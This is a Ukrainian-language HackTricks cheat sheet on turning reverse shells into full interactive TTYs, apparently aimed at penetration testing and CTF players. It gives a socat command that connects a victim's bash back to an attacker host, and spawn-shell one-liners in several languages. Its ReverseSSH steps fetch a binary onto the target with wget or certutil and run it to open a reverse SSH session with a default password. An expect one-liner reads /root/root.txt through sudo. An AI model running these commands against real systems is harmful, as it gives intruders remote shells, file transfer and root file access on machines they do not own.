# Повноцінні TTY

{{#include ../../banners/hacktricks-training.md}}

## Повноцінний TTY

Зверніть увагу, що shell, указаний у змінній `SHELL`, **має бути** **вказаний у** _**/etc/shells**_, інакше з’явиться повідомлення `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Також зверніть увагу, що наступні фрагменти працюють лише в bash. Якщо ви використовуєте zsh, перед отриманням shell перейдіть на bash, виконавши `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Ви можете отримати **кількість** **рядків** і **стовпців**, виконавши **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Зручним способом отримати **інтерактивний доступ до shell**, а також виконувати **передавання файлів** і **перенаправлення портів**, є завантаження статично скомпільованого ssh-сервера [ReverseSSH](https://github.com/Fahrj/reverse-ssh) на цільову систему.<sup>[[1]](#references)</sup>

Нижче наведено приклад для `x86` із бінарними файлами, стисненими за допомогою upx. Для інших бінарних файлів перегляньте [сторінку релізів](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Підготуйте локальну систему для перехоплення запиту на перенаправлення ssh-порту:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Цільова система Windows 10 (для попередніх версій див. [readme проєкту](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Якщо запит на перенаправлення порту ReverseSSH був успішним, тепер ви маєте змогу увійти за допомогою стандартного пароля `letmeinbrudipls` у контексті користувача, від імені якого запущено `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) автоматично підвищує Linux reverse shells до TTY, обробляє розмір термінала, записує все та багато іншого. Також вона забезпечує підтримку readline для Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Без TTY

Якщо з певної причини вам не вдається отримати повний TTY, ви **все одно можете взаємодіяти з програмами**, які очікують введення користувача. У наступному прикладі пароль передається до `sudo`, щоб прочитати файл:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Посилання

- [1] [ReverseSSH - Статично скомпільований ssh-сервер із функціональністю reverse shell для CTF та подібних завдань](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Обробник Shell, який автоматизує деякі операції для спрощення роботи](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
